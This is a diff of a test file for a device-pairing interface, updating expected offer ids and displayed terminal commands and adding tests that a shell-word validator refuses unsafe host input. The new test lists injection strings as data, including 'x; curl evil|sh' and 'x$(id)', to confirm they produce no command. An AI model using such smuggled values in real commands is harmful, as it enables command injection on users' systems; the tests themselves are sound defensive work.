@@ -249,7 +249,7 @@ describe('compare the code', () => {
     await user.type(input, 'k7q-2ma')
     expect(approve).toBeEnabled()
     await user.click(approve)
-    await waitFor(() => expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['of_' + '7'.repeat(32), true]))
+    await waitFor(() => expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['7'.repeat(32), true]))
   })
 
   it('three typed mismatches refuse the offer; the remaining attempts are shown', async () => {
@@ -266,13 +266,13 @@ describe('compare the code', () => {
     await user.clear(input)
     await user.type(input, 'CCCCCC')
     expect(await screen.findByTestId('pair-end-rejected', {}, T)).toHaveTextContent('The codes differed 3 times')
-    expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['of_' + '7'.repeat(32), false, { mismatches: 3 }])
+    expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['7'.repeat(32), false, { mismatches: 3 }])
   })
 
   it('Reject answers no', async () => {
     const { user } = open('pair-pending')
     await user.click(await screen.findByRole('button', { name: 'Reject' }, T))
-    await waitFor(() => expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['of_' + '7'.repeat(32), false]))
+    await waitFor(() => expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['7'.repeat(32), false]))
     expect(await screen.findByTestId('pair-end-rejected', {}, T)).toHaveTextContent('Rejected on this Mac.')
   })
 
@@ -299,8 +299,8 @@ describe('after the code', () => {
   it('cert_pending shows the two terminal steps with copyable commands and the cert code', async () => {
     open('pair-cert')
     expect(await screen.findByTestId('pair-cert-code', {}, T)).toHaveTextContent('H4WZ7P')
-    expect(screen.getByTestId('pair-primary-command').textContent).toBe('orch keys primary approve')
-    expect(screen.getByTestId('pair-sign-command').textContent).toBe('orch sign <code>')
+    expect(screen.getByTestId('pair-primary-command').textContent).toBe('orch host relay pair --resume --offer ' + '7'.repeat(32))
+    expect(screen.getByTestId('pair-sign-command').textContent).toBe('orch sign <CODE>')
     expect(screen.getByTestId('pair-cert')).toHaveTextContent('refuses click-to-sign')
     for (const id of ['pair-primary-command', 'pair-sign-command']) expect(screen.getByTestId(id).closest('a')).toBeNull()
     expect(screen.queryByRole('button', { name: 'Get the signing code' })).toBeNull()
@@ -321,6 +321,26 @@ describe('after the code', () => {
     const end = await screen.findByTestId('pair-end-failed', {}, T)
     expect(end).toHaveTextContent('the certificate did not verify')
     expect(screen.getByTestId('pair-needs-remove')).toHaveTextContent('remove the device')
+  })
+})
+
+describe('commands for the shell (review N1)', () => {
+  it('only plain words from the host go into a command; anything else gives no command', async () => {
+    const { shellWord, deviceRemoveCommand, primaryCommand, convenienceOffCommand } = await import('@/api/pairing')
+    for (const bad of ['x; curl evil|sh', 'x$(id)', 'a\u202Eb', 'a\u200Bb', '', '-rf', 'a b', 'a\nb']) {
+      expect(shellWord(bad)).toBe(false)
+      expect(deviceRemoveCommand(bad, 'DEMO')).toBeNull()
+      expect(convenienceOffCommand(bad)).toBeNull()
+    }
+    expect(deviceRemoveCommand('d_' + '2'.repeat(32), 'DEMO')).toBe('orch device remove d_' + '2'.repeat(32) + ' --workspace DEMO')
+    expect(primaryCommand('7'.repeat(32))).toBe('orch host relay pair --resume --offer ' + '7'.repeat(32))
+    for (const bad of ['of_c', '7'.repeat(31), 'A'.repeat(32), '7'.repeat(31) + ';', null, undefined]) expect(primaryCommand(bad)).toBeNull()
+  })
+
+  it('an offer id the command can not carry gives a warning instead of a command', async () => {
+    open('pair-cert', { offers: [{ offer_id: 'of_c', state: 'cert_pending', created_ms: 0, expires_ms: Date.now() + 60_000, scopes: ['look'] }] })
+    expect(await screen.findByTestId('pair-command-unsafe', {}, T)).toHaveTextContent('start again')
+    expect(screen.queryByTestId('pair-primary-command')).toBeNull()
   })
 })
 
